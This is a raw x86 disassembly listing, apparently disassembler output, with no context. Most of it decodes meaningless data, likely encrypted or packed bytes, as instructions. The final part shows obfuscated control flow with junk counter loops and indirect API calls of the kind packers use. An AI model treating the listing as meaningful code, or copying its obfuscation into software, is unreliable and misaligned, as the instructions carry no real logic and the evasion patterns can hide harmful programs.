  4099a0:	and    BYTE PTR ds:0x4929544,ch
  4099a6:	in     eax,dx
  4099a7:	test   al,0xde
  4099a9:	lahf   
  4099aa:	test   eax,0x8352da41
  4099af:	sbb    al,0xbc
  4099b1:	and    eax,0xb0dbf18f
  4099b6:	jns    0x4099e4
  4099b8:	outs   dx,DWORD PTR ds:[esi]
  4099b9:	loope  0x409999
  4099bb:	xor    ah,BYTE PTR [ebx-0x4d]
  4099be:	ds cdq 
  4099c0:	inc    esp
  4099c1:	mov    bl,0xec
  4099c3:	pop    ss
  4099c4:	add    al,BYTE PTR [edi+0x775669be]
  4099ca:	ficomp DWORD PTR [edi+0x53]
  4099cd:	adc    DWORD PTR ds:0xef6f7325,0x55
  4099d4:	xchg   edx,eax
  4099d5:	mov    edx,0xbc201d66
  4099da:	mov    DWORD PTR [esi-0x24],edx
  4099dd:	aam    0x64
  4099df:	xchg   esi,eax
  4099e0:	cmp    BYTE PTR [ebp+0x16bd90c3],ch
  4099e6:	stos   BYTE PTR es:[edi],al
  4099e7:	sbb    edi,DWORD PTR [esi]
  4099e9:	add    dl,bl
  4099eb:	mov    edi,0x53c9481c
  4099f0:	push   ss
  4099f1:	and    ecx,DWORD PTR [edi-0x43]
  4099f4:	aad    0xb2
  4099f6:	test   DWORD PTR [eax+0x7a],0xafbb52ce
  4099fd:	in     eax,dx
  4099fe:	add    ebx,DWORD PTR [ebx]
  409a00:	push   edx
  409a01:	scas   eax,DWORD PTR es:[edi]
  409a02:	push   ss
  409a03:	(bad)  
  409a04:	and    BYTE PTR [eax],bh
  409a06:	arpl   bp,bx
  409a08:	fist   WORD PTR [eax+0x7f]
  409a0b:	push   cs
  409a0c:	dec    esi
  409a0d:	call   0x8153a3f2
  409a12:	in     al,0x76
  409a14:	sub    bl,BYTE PTR [esi-0x1eb47be0]
  409a1a:	pop    es
  409a1b:	adc    al,0x36
  409a1d:	icebp  
  409a1e:	test   al,0x2c
  409a20:	or     esi,DWORD PTR [ecx+ebx*4+0x61fe5f42]
  409a27:	sbb    cl,0xb
  409a2a:	xor    cl,BYTE PTR ds:0xe2745945
  409a30:	pop    eax
  409a31:	popa   
  409a32:	cld    
  409a33:	fwait
  409a34:	pop    ebp
  409a35:	push   ecx
  409a36:	inc    edx
  409a37:	mov    cl,BYTE PTR [ebx+0x1b]
  409a3a:	retf   0xb2d2
  409a3d:	push   ds
  409a3e:	mov    ch,0xf7
  409a40:	push   0xf5418cf0
  409a45:	mov    eax,ds:0xa43ce871
  409a4a:	mov    eax,0x3cccbcbf
  409a4f:	push   esp
  409a50:	sub    eax,0x59da2c7
  409a55:	jo     0x409aa4
  409a57:	(bad)  
  409a58:	mov    bl,0x7e
  409a5a:	into   
  409a5b:	fsub   DWORD PTR [ecx+0x67]
  409a5e:	idiv   BYTE PTR [ebx]
  409a60:	xor    eax,DWORD PTR [esi+0xc]
  409a63:	push   esi
  409a64:	push   esi
  409a65:	pop    esp
  409a66:	push   edx
  409a67:	xlat   BYTE PTR ds:[ebx]
  409a68:	xchg   bl,cl
  409a6a:	aad    0xd7
  409a6c:	mov    edi,0x845f1498
  409a71:	hlt    
  409a72:	scas   al,BYTE PTR es:[edi]
  409a73:	pop    edi
  409a74:	repz scas al,BYTE PTR es:[edi]
  409a76:	fisttp DWORD PTR [eax+edi*4-0x72e4b8e4]
  409a7d:	mov    ds:0xf5dfab7,al
  409a82:	jl     0x409a50
  409a84:	sub    DWORD PTR [ebp+0x54],0xffffff90
  409a88:	shl    BYTE PTR [edi-0x4a16904e],cl
  409a8e:	jecxz  0x409abc
  409a90:	push   edi
  409a91:	or     al,0x4c
  409a93:	inc    esp
  409a94:	xor    ch,BYTE PTR [edx]
  409a96:	dec    esi
  409a97:	int    0x62
  409a99:	mov    eax,ds:0x4c44f547
  409a9e:	xchg   edx,eax
  409a9f:	pop    fs
  409aa1:	jae    0x409a6d
  409aa3:	xchg   edi,eax
  409aa4:	mov    eax,0x401d4573
  409aa9:	or     edx,esi
  409aab:	cld    
  409aac:	xchg   ecx,eax
  409aad:	inc    eax
  409aae:	or     edx,DWORD PTR [esi]
  409ab0:	xor    eax,0xf3b2dd9a
  409ab5:	add    DWORD PTR [eax-0x3],ebp
  409ab8:	mov    ebp,0x829010f2
  409abd:	jb     0x409ab8
  409abf:	push   0xf4172ad9
  409ac4:	push   ebp
  409ac5:	mov    al,0x28
  409ac7:	mov    ah,BYTE PTR [edi]
  409ac9:	fadd   DWORD PTR ds:0xb5953851
  409acf:	jl     0x409a95
  409ad1:	xor    BYTE PTR [eax-0x19],bl
  409ad4:	cmp    edx,DWORD PTR [ecx]
  409ad6:	fsub   DWORD PTR [ebp+0x38]
  409ad9:	adc    esp,DWORD PTR [esi]
  409adb:	scas   al,BYTE PTR es:[edi]
  409adc:	mov    al,0x62
  409ade:	mov    ch,0x47
  409ae0:	sub    BYTE PTR [ecx+0x7a],0x9a
  409ae4:	sbb    al,0xc4
  409ae6:	mov    esp,0x408d80af
  409aeb:	(bad)  
  409aec:	call   0xc4af:0xa9ab6e1
  409af3:	pop    ss
  409af4:	ja     0x409aba
  409af6:	sub    dl,BYTE PTR [edx+0x39]
  409af9:	sbb    ch,cl
  409afb:	out    0xcd,al
  409afd:	mov    ecx,0xce5d406a
  409b02:	ret    
  409b03:	push   edx
  409b04:	stc    
  409b05:	lods   al,BYTE PTR ds:[esi]
  409b06:	pop    ss
  409b07:	xlat   BYTE PTR ds:[ebx]
  409b08:	retf   0x72eb
  409b0b:	sbb    ax,0x4346
  409b0f:	not    bl
  409b11:	ins    DWORD PTR es:[edi],dx
  409b12:	pop    esi
  409b13:	sub    ebx,DWORD PTR [edi]
  409b15:	jmp    0x409b60
  409b17:	pop    ecx
  409b18:	adc    eax,0x6b3f2ac8
  409b1d:	les    eax,FWORD PTR [ecx]
  409b1f:	mov    esp,0x2ef4bee5
  409b24:	adc    eax,0x5f35e8ee
  409b29:	sub    eax,0xa0c4b599
  409b2e:	sub    bl,bh
  409b30:	dec    ebp
  409b31:	ror    DWORD PTR ds:0x854447cf,0x95
  409b38:	and    esp,DWORD PTR [esi+edi*1]
  409b3b:	pop    es
  409b3c:	sub    ecx,ebx
  409b3e:	dec    esp
  409b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b40:	pop    ss
  409b41:	dec    esi
  409b42:	xor    bl,cl
  409b44:	xchg   edi,eax
  409b45:	out    0x4d,al
  409b47:	outs   dx,BYTE PTR ds:[esi]
  409b48:	or     BYTE PTR [ebx+0x1d],dh
  409b4b:	pop    ebx
  409b4c:	minps  xmm0,XMMWORD PTR [edi+ebp*1]
  409b50:	sub    al,0x71
  409b52:	mov    ecx,0xfc1032c5
  409b57:	mov    esi,DWORD PTR [esi]
  409b59:	aas    
  409b5a:	mov    ah,0x86
  409b5c:	adc    BYTE PTR [ecx+0x61],bh
  409b5f:	ret    
  409b60:	sub    BYTE PTR [ebp+0x534685b2],0x29
  409b67:	add    edx,eax
  409b69:	pop    edi
  409b6a:	(bad)  
  409b6b:	mov    bh,0x25
  409b6d:	add    eax,DWORD PTR [edi]
  409b6f:	or     dl,BYTE PTR [eax+0x7763cebe]
  409b75:	and    eax,0xfd1a0629
  409b7a:	inc    esp
  409b7b:	retf   
  409b7c:	out    0x15,eax
  409b7e:	jge    0x409ba8
  409b80:	dec    esi
  409b81:	sub    ebx,DWORD PTR [ebx-0x2]
  409b84:	mov    bh,0x4a
  409b86:	call   DWORD PTR [ebp-0x5a4fc6cf]
  409b8c:	in     eax,dx
  409b8d:	sub    esp,DWORD PTR [edx]
  409b8f:	fucomip st,st(4)
  409b91:	jnp    0x409b2d
  409b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b94:	adc    dh,BYTE PTR [ebp-0x7a540ed5]
  409b9a:	(bad)  
  409b9b:	mov    al,0xd3
  409b9d:	pushf  
  409b9e:	stos   DWORD PTR es:[edi],eax
  409b9f:	mov    ss,WORD PTR gs:[esp+ecx*8-0x7d]
  409ba4:	pop    edi
  409ba5:	mov    dh,0xbf
  409ba7:	fsub   QWORD PTR [ebx]
  409ba9:	cwde   
  409baa:	mov    BYTE PTR [eax+0x5c],cl
  409bad:	bound  eax,QWORD PTR [ebp+0x49]
  409bb0:	inc    edx
  409bb1:	xor    cl,BYTE PTR [ecx+0x60f54b4c]
  409bb7:	loopne 0x409bc0
  409bb9:	inc    edx
  409bba:	inc    ecx
  409bbb:	jne    0x409b54
  409bbd:	push   esp
  409bbe:	addr16 icebp 
  409bc0:	out    0x2e,al
  409bc2:	jp     0x409ba4
  409bc4:	jle    0xe649ff7b
  409bca:	nop
  409bcb:	adc    DWORD PTR [edi+esi*4+0x21],edi
  409bcf:	mov    al,dh
  409bd1:	ret    0x197c
  409bd4:	out    dx,al
  409bd5:	nop
  409bd6:	outs   dx,BYTE PTR ds:[esi]
  409bd7:	std    
  409bd8:	ret    
  409bd9:	pop    ecx
  409bda:	push   edi
  409bdb:	js     0x409c43
  409bdd:	dec    ebx
  409bde:	mov    eax,0xfa3acf2c
  409be3:	icebp  
  409be4:	lods   al,BYTE PTR ds:[esi]
  409be5:	popf   
  409be6:	jmp    0x1a12:0x532d3b15
  409bed:	add    ch,bl
  409bef:	mov    BYTE PTR [eax+0x6b],ch
  409bf2:	mov    edi,0xe4904b1a
  409bf7:	(bad)  
  409bf8:	addr16 push 0xffffffb4
  409bfb:	fwait
  409bfc:	sub    eax,0xe777cf08
  409c01:	dec    DWORD PTR [esi]
  409c03:	push   ebp
  409c04:	lahf   
  409c05:	pop    esp
  409c06:	xchg   ebp,eax
  409c07:	ja     0x409c5f
  409c09:	and    al,0x1f
  409c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c0c:	xchg   edi,eax
  409c0d:	adc    DWORD PTR [eax-0x49],esp
  409c10:	dec    ecx
  409c11:	push   ss
  409c12:	mov    DWORD PTR [esi+0x3fdac2a],ebx
  409c18:	in     eax,dx
  409c19:	and    esp,esp
  409c1b:	push   ss
  409c1c:	cs in  al,dx
  409c1e:	mov    eax,0x189f8518
  409c23:	and    cl,BYTE PTR [esi-0x6b]
  409c26:	mov    dl,0xc3
  409c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c29:	mov    ecx,0xd74dea6a
  409c2e:	out    dx,al
  409c2f:	mov    ds:0xb90175aa,eax
  409c34:	fdivr  QWORD PTR [esi-0x74]
  409c37:	add    esi,0x7afd670a
  409c3d:	out    0xd5,al
  409c3f:	loope  0x409cb4
  409c41:	dec    edx
  409c42:	jae    0x409cb4
  409c44:	mov    al,0xee
  409c46:	shl    BYTE PTR [edi+edx*2],0x26
  409c4a:	add    ah,BYTE PTR [eax]
  409c4c:	sub    edx,DWORD PTR [esi+eax*8]
  409c4f:	bsr    esp,DWORD PTR ds:0xc928554
  409c56:	jbe    0x409c45
  409c58:	sbb    ah,BYTE PTR [edi]
  409c5a:	cmp    al,0xe
  409c5c:	mov    dh,0x68
  409c5e:	xchg   ebx,eax
  409c5f:	xor    ch,dh
  409c61:	add    BYTE PTR [edx-0x37],dh
  409c64:	cmp    al,BYTE PTR [esi+0x24]
  409c67:	jae    0x409cab
  409c69:	fcomp  QWORD PTR [edi-0x18ebecbc]
  409c6f:	mov    edx,0x73f7471c
  409c74:	sub    eax,DWORD PTR [esi]
  409c76:	mov    cs,edi
  409c78:	pop    ecx
  409c79:	out    dx,eax
  409c7a:	fldenv [esp+ebx*8-0x3b8329bc]
  409c81:	jmp    0x34ef:0x4cf2a5aa
  409c88:	(bad)  
  409c89:	dec    edi
  409c8a:	ins    BYTE PTR es:[edi],dx
  409c8b:	fldenv [ecx+edx*1-0x486e04e7]
  409c92:	rcr    cl,0x18
  409c95:	stos   BYTE PTR es:[edi],al
  409c96:	mov    ss,WORD PTR [esi]
  409c98:	jne    0x409c38
  409c9a:	stos   DWORD PTR es:[edi],eax
  409c9b:	in     al,dx
  409c9c:	lock retf 
  409c9e:	push   ebp
  409c9f:	add    ecx,edi
  409ca1:	in     eax,0x18
  409ca3:	mov    bh,0x7a
  409ca5:	mov    edx,0x3cb4c5a1
  409caa:	clc    
  409cab:	sbb    eax,0x30a6c9aa
  409cb0:	ret    
  409cb1:	jmp    DWORD PTR [esi]
  409cb3:	sub    DWORD PTR [ebx+0x4b],eax
  409cb6:	push   ecx
  409cb7:	adc    al,0xf6
  409cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cba:	fidivr DWORD PTR [ebx]
  409cbc:	and    al,0xae
  409cbe:	in     eax,dx
  409cbf:	jno    0x409ce3
  409cc1:	fmul   QWORD PTR [ecx+0x71]
  409cc4:	sub    dl,cl
  409cc6:	adc    dl,BYTE PTR [ecx]
  409cc8:	es int3 
  409cca:	dec    esp
  409ccb:	push   ebp
  409ccc:	xor    al,BYTE PTR [ebp-0xa6036d8]
  409cd2:	shl    DWORD PTR [ecx-0x31],cl
  409cd5:	inc    esi
  409cd6:	or     dl,BYTE PTR [edx+0x5]
  409cd9:	pop    esp
  409cda:	xchg   ecx,eax
  409cdb:	xchg   ebp,eax
  409cdc:	dec    edi
  409cdd:	xor    eax,ebx
  409cdf:	loopne 0x409d54
  409ce1:	mov    eax,ds:0x964c39a
  409ce6:	xchg   esi,eax
  409ce7:	sub    BYTE PTR [ecx+0x1f],dl
  409cea:	mov    ch,0x78
  409cec:	fmul   DWORD PTR [esi]
  409cee:	test   al,0x8
  409cf0:	sub    dl,ch
  409cf2:	pusha  
  409cf3:	sub    dl,BYTE PTR [edx+0x6961109d]
  409cf9:	pushf  
  409cfa:	ins    DWORD PTR es:[edi],dx
  409cfb:	and    al,0x83
  409cfd:	pop    ebx
  409cfe:	hlt    
  409cff:	xchg   edx,eax
  409d00:	inc    esp
  409d01:	popa   
  409d02:	cwde   
  409d03:	sub    BYTE PTR [ebp+0x45],ah
  409d06:	rcr    DWORD PTR [edx+0x53e0d638],cl
  409d0c:	push   edx
  409d0d:	lea    esp,[ecx+0x5cac8175]
  409d13:	pop    eax
  409d14:	pop    ds
  409d15:	inc    eax
  409d16:	push   edx
  409d17:	push   ebx
  409d18:	jae    0x409d50
  409d1a:	xchg   BYTE PTR [edx+0x282260cf],cl
  409d20:	pop    esp
  409d21:	into   
  409d22:	mov    esp,0x505bdee
  409d27:	and    DWORD PTR [ebx-0x26f25b6a],esp
  409d2d:	inc    esp
  409d2e:	mov    ebp,0xe3b9b5ed
  409d33:	sub    esp,DWORD PTR [esi+0x5e]
  409d36:	pop    ss
  409d37:	xor    DWORD PTR ss:0x1911d9f4,ebp
  409d3e:	xlat   BYTE PTR ds:[ebx]
  409d3f:	xchg   esp,eax
  409d40:	push   ss
  409d41:	inc    eax
  409d42:	mov    ecx,0xb5788c78
  409d47:	jne    0x409d93
  409d49:	int    0x7e
  409d4b:	cdq    
  409d4c:	loopne 0x409cdc
  409d4e:	into   
  409d4f:	idiv   BYTE PTR [ebx-0x6268db11]
  409d55:	fldenv [ebp+0x2ba9e76a]
  409d5b:	std    
  409d5c:	adc    ecx,DWORD PTR [ecx-0x69]
  409d5f:	adc    al,0xdb
  409d61:	adc    ebp,DWORD PTR [ecx]
  409d63:	mov    ecx,0xb6faa89
  409d68:	jl     0x409d98
  409d6a:	out    dx,eax
  409d6b:	and    esi,DWORD PTR [edx]
  409d6d:	inc    esi
  409d6e:	mov    edx,0xd33eb1eb
  409d73:	ror    BYTE PTR [esi+0x0],0x2
  409d77:	cdq    
  409d78:	xor    ecx,DWORD PTR [edx+esi*4-0x23]
  409d7c:	add    al,ch
  409d7e:	in     al,dx
  409d7f:	test   BYTE PTR ds:0xc5ad69dd,dl
  409d85:	clc    
  409d86:	loope  0x409d26
  409d88:	stos   BYTE PTR es:[edi],al
  409d89:	ss jmp 0x8d8d:0x9cf6ce49
  409d91:	ss gs pop sp
  409d95:	jl     0x409d74
  409d97:	jno    0x409dbe
  409d99:	add    eax,0xd1bd171a
  409d9e:	inc    esp
  409d9f:	loopne 0x409e05
  409da1:	xchg   BYTE PTR [edi+0x92d03e6],ch
  409da7:	jmp    0x7fe1778f
  409dac:	jbe    0x409da9
  409dae:	push   eax
  409daf:	in     eax,0x3f
  409db1:	cld    
  409db2:	adc    eax,DWORD PTR [edi-0x5a84ade7]
  409db8:	ds cwde 
  409dba:	dec    esi
  409dbb:	mov    esi,0xbcc80d1d
  409dc0:	ins    BYTE PTR es:[edi],dx
  409dc1:	jne    0x409d78
  409dc3:	call   0x3551:0x25433caf
  409dca:	sbb    ebp,eax
  409dcc:	(bad)  
  409dcd:	dec    edx
  409dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dcf:	fadd   st(5),st
  409dd1:	ins    DWORD PTR es:[edi],dx
  409dd2:	loopne 0x409df8
  409dd4:	dec    ebx
  409dd5:	mov    ah,0x8f
  409dd7:	out    0x3a,al
  409dd9:	sbb    BYTE PTR [ecx+0x43d4af68],ch
  409ddf:	sub    ch,BYTE PTR [esi+edi*1+0x7c]
  409de3:	ret    0x676c
  409de6:	or     edi,ebx
  409de8:	cmp    eax,0x401219ce
  409ded:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409def:	sbb    BYTE PTR [ecx],dh
  409df1:	mov    esi,0xab1f2836
  409df6:	(bad)  
  409df7:	call   0xe2d2:0x9f3d11e6
  409dfe:	pop    edi
  409dff:	push   ecx
  409e00:	mov    eax,ds:0xe6b5dc0f
  409e05:	jbe    0x409e48
  409e07:	dec    ecx
  409e08:	xchg   edi,eax
  409e09:	in     al,dx
  409e0a:	add    eax,0x22a8c662
  409e0f:	in     eax,dx
  409e10:	shl    DWORD PTR [ecx-0x6b95aea2],0x0
  409e17:	(bad)  
  409e18:	bound  esi,QWORD PTR es:0xc265b98b
  409e1f:	inc    esi
  409e20:	cmp    ah,dh
  409e22:	pusha  
  409e23:	jnp    0x409e8d
  409e25:	lods   al,BYTE PTR ds:[esi]
  409e26:	mov    ebx,0x3efb1419
  409e2b:	ret    
  409e2c:	sbb    cl,BYTE PTR [edx+0x29]
  409e2f:	fs iret 
  409e31:	cmp    DWORD PTR [edx-0x1b],ebx
  409e34:	ins    BYTE PTR es:[edi],dx
  409e35:	shl    BYTE PTR fs:[ecx+0x44],1
  409e39:	xchg   esp,eax
  409e3a:	out    dx,eax
  409e3b:	mov    esi,0xc4bc4547
  409e40:	sub    al,0xe8
  409e42:	inc    esp
  409e43:	fstp   DWORD PTR [ebp-0x6ea4afe3]
  409e49:	std    
  409e4a:	ss mov bh,0x86
  409e4d:	lea    esp,[edx+0x28a21064]
  409e53:	icebp  
  409e54:	mov    cl,0x33
  409e56:	sbb    eax,0xfec6cd49
  409e5b:	inc    edx
  409e5c:	ret    0xb823
  409e5f:	outs   dx,BYTE PTR ds:[esi]
  409e60:	mov    ds,WORD PTR [esp+ecx*1]
  409e63:	pop    edi
  409e64:	or     ebx,esp
  409e66:	mov    ecx,0x65bca97e
  409e6b:	mov    cl,0x15
  409e6d:	retf   
  409e6e:	imul   BYTE PTR [edi]
  409e70:	mov    ch,0x93
  409e72:	sbb    DWORD PTR [edx+0xf7df786],esi
  409e78:	xor    DWORD PTR [edi+ebx*4+0x29],0xdad2b41f
  409e80:	out    dx,eax
  409e81:	sub    ch,BYTE PTR [ebx-0x1f]
  409e84:	shl    BYTE PTR [ebx-0x79bf5224],1
  409e8a:	int    0x1d
  409e8c:	dec    ebp
  409e8d:	add    DWORD PTR [edx-0x37],0xca902c19
  409e94:	and    ebp,DWORD PTR [esi]
  409e96:	sbb    ch,BYTE PTR [esp+edx*4+0x5d1f375d]
  409e9d:	add    dh,BYTE PTR [ebx+0x72344b1f]
  409ea3:	push   edi
  409ea4:	lods   al,BYTE PTR ds:[esi]
  409ea5:	inc    edi
  409ea6:	je     0x409edf
  409ea8:	jmp    0x409e9b
  409eaa:	in     eax,dx
  409eab:	add    BYTE PTR [edi-0xa],0x6c
  409eaf:	(bad)  
  409eb0:	dec    ebx
  409eb1:	sub    al,0xa8
  409eb3:	cmp    al,0x15
  409eb5:	repz sub al,0x3d
  409eb8:	lahf   
  409eb9:	xor    ecx,ebp
  409ebb:	(bad)  
  409ebd:	inc    ebx
  409ebe:	stos   BYTE PTR es:[edi],al
  409ebf:	mov    dh,0xfe
  409ec1:	jbe    0x409e68
  409ec3:	mov    bl,0x74
  409ec5:	(bad)  
  409ec6:	fs sbb al,0x46
  409ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eca:	stos   BYTE PTR es:[edi],al
  409ecb:	mov    al,ds:0xe712aec9
  409ed0:	adc    al,0xf1
  409ed2:	mov    DWORD PTR [ebp+0x2f1d3b84],esi
  409ed8:	mov    bl,0x30
  409eda:	jb     0x409f32
  409edc:	jns    0x409e7c
  409ede:	inc    ecx
  409edf:	fimul  WORD PTR [edx+0x831e3eb]
  409ee5:	out    0x41,al
  409ee7:	mov    cl,0x10
  409ee9:	inc    ecx
  409eea:	cmp    ebx,DWORD PTR [ebp+0x52d549e6]
  409ef0:	dec    edi
  409ef1:	or     ebp,DWORD PTR [ebx+edx*8-0x44b50d1b]
  409ef8:	sub    esp,DWORD PTR [ecx-0x61]
  409efb:	jb     0x409f00
  409efd:	mov    BYTE PTR [edx],ah
  409eff:	ficom  DWORD PTR [esp+edx*1-0x2b]
  409f03:	pop    es
  409f04:	popf   
  409f05:	call   0x8c36:0x50f4de5c
  409f0c:	jp     0x409ebc
  409f0e:	ret    0x6b0e
  409f11:	repnz pushf 
  409f13:	sahf   
  409f14:	cmp    al,0x36
  409f16:	dec    esp
  409f17:	mov    ecx,0xba414b99
  409f1c:	and    WORD PTR [eax-0x2eba5b2a],0x36f4
  409f25:	out    dx,eax
  409f26:	mov    edi,0x59efdfc8
  409f2b:	test   esi,eax
  409f2d:	and    edi,DWORD PTR [ebx-0x3caea5a1]
  409f33:	jmp    0x2022:0xe3d1e3f6
  409f3a:	sbb    eax,0x561e3916
  409f3f:	and    ch,BYTE PTR [ecx]
  409f41:	pop    edx
  409f42:	ins    DWORD PTR es:[edi],dx
  409f43:	arpl   WORD PTR [edx],si
  409f45:	pop    ecx
  409f46:	cld    
  409f47:	and    DWORD PTR [ebx],esi
  409f49:	jnp    0x409f19
  409f4b:	fisub  DWORD PTR [edx-0x4b]
  409f4e:	add    al,0x7e
  409f50:	mov    ch,0x10
  409f52:	ins    DWORD PTR es:[edi],dx
  409f53:	mov    eax,0x1257b48b
  409f58:	mov    al,0x80
  409f5a:	or     ch,BYTE PTR [eax+0xf5f5253]
  409f60:	push   ss
  409f61:	jge    0x409fcb
  409f63:	and    ebx,DWORD PTR [ebx-0x5c398a4]
  409f69:	jne    0x409fa1
  409f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6c:	jnp    0x409f8b
  409f6e:	cli    
  409f6f:	sub    DWORD PTR [ecx+eiz*1],0xc7d16912
  409f76:	test   BYTE PTR [ecx-0x2],bl
  409f79:	pop    edi
  409f7a:	pusha  
  409f7b:	stos   DWORD PTR es:[edi],eax
  409f7c:	ss push es
  409f7e:	xchg   esp,eax
  409f7f:	cdq    
  409f80:	hlt    
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
